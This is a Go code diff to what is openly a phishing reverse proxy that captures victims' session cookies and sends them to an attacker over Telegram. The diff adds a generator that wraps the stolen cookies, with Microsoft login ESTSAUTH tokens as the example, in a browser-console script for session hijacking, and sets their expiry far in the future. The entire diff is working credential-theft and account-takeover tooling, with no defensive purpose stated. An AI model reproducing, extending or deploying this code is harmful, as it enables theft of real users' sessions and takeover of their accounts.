@@ -292,6 +292,19 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 			txtContent += fmt.Sprintf("%s=%s\n", c.Name, c.Value)
 		}
 
+		// Generate ready-to-use cookie replay script
+		txtContent += "\n\n=== COOKIE REPLAY SCRIPT ===\n"
+		txtContent += "// Open browser console on target domain. Paste and run:\n"
+		txtContent += fmt.Sprintf("// Target: %s\n", upstream)
+		txtContent += "(function(){\nvar c=[\n"
+		for _, c := range capturedCookies {
+			txtContent += buildReplayCookie(c) + ",\n"
+		}
+		txtContent += "];\n"
+		txtContent += "for(var i=0;i<c.length;i++){document.cookie=c[i].n+'='+c[i].v+';expires='+c[i].e+';path='+c[i].p+(c[i].d?';domain='+c[i].d:'')+(c[i].s?';Secure':'')};\n"
+		txtContent += "location.reload();\n"
+		txtContent += "})();\n"
+
 		filename := fmt.Sprintf("session-%s.txt", time.Now().UTC().Format("20060102-150405"))
 		sendTelegramDocument(msg, filename, []byte(txtContent))
 	}
@@ -336,6 +349,51 @@ func rewriteBody(resp *http.Response, upstreamHost, ourHost string) {
 	resp.ContentLength = int64(len(rewritten))
 	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(rewritten)))
 	resp.Header.Del("Content-Encoding") // deflate/gzip won't match rewritten body
+}
+
+// buildReplayCookie parses a Set-Cookie header into a JS object literal for replay.
+// Input: "ESTSAUTH=abc123; domain=.login.microsoftonline.com; path=/; secure; HttpOnly"
+// Output: "{n:'ESTSAUTH',v:'abc123',d:'.login.microsoftonline.com',p:'/',s:true,e:'9999999999'}"
+func buildReplayCookie(setCookie string) string {
+	parts := strings.Split(setCookie, ";")
+	if len(parts) == 0 {
+		return "{}"
+	}
+	// Parse name=value
+	kv := strings.SplitN(strings.TrimSpace(parts[0]), "=", 2)
+	name := kv[0]
+	value := ""
+	if len(kv) > 1 {
+		value = kv[1]
+	}
+	domain := ""
+	path := "/"
+	secure := false
+	expires := "9999999999"
+	for _, p := range parts[1:] {
+		p = strings.TrimSpace(p)
+		if strings.HasPrefix(strings.ToLower(p), "domain=") {
+			domain = strings.TrimPrefix(p, "domain=")
+			domain = strings.TrimPrefix(domain, "Domain=")
+		}
+		if strings.HasPrefix(strings.ToLower(p), "path=") {
+			path = strings.TrimPrefix(p, "path=")
+			path = strings.TrimPrefix(path, "Path=")
+		}
+		if strings.EqualFold(strings.TrimSpace(p), "secure") {
+			secure = true
+		}
+		if strings.HasPrefix(strings.ToLower(p), "expires=") {
+			expires = strings.TrimPrefix(p, "expires=")
+			expires = strings.TrimPrefix(expires, "Expires=")
+		}
+	}
+	// Use JS-safe value escaping
+	value = strings.ReplaceAll(value, "'", "\\'")
+	value = strings.ReplaceAll(value, "\"", "\\\"")
+	domain = strings.ReplaceAll(domain, "'", "\\'")
+	return fmt.Sprintf("{n:'%s',v:'%s',d:'%s',p:'%s',s:%v,e:'%s'}",
+		name, value, domain, path, secure, expires)
 }
 
 func extractFormField(body, field string) string {
